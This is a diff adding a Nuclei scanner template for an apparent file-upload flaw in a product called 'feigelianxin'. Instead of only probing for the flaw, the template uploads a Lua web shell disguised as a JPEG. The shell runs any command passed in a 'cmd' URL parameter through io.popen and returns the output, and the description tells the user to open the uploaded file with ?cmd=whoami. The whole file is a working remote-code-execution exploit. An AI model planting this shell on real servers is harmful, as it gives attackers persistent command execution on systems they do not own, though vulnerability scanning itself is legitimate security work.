@@ -1,0 +1,49 @@
+id: feigelianxin-filesupload
+info:
+  name: feigelianxin-filesupload
+  author: lemonlove7
+  severity: critical
+  description: 访问上传的文件地址/file/xxx.lua?cmd=whoami
+http:
+  - raw:
+      - |-
+        POST /files.lua?a=v2 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----geckoformboundary20f63cf5367f78c58c0a5a7ea7ec6e71
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0
+        Accept-Encoding: gzip, deflate
+        Authorization: 
+        Accept: */*
+        Cookie: 
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Content-Length: 103498
+        
+        ------geckoformboundary20f63cf5367f78c58c0a5a7ea7ec6e71
+        Content-Disposition: form-data; name="filename0"; filename="1.lua"
+        Content-Type: image/jpeg
+        
+        function handle_request()
+            local query = mg.request_info.query_string or ""
+            local cmd = string.match(query, "cmd=([^&]+)")
+            if not cmd then
+                mg.write("Content-Type: text/plain\r\n\r\n请传入cmd参数，示例：?cmd=whoami")
+                return
+            end
+            local handle = io.popen(cmd, "r")
+            local result = handle:read("*a")
+            handle:close()
+            mg.write("Content-Type: text/plain; charset=utf-8\r\n\r\n")
+            mg.write("命令输出：\n" .. (result or "无输出"))
+        end
+        
+        handle_request()
+        ------geckoformboundary20f63cf5367f78c58c0a5a7ea7ec6e71--
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"filename":'
+    matchers-condition: and
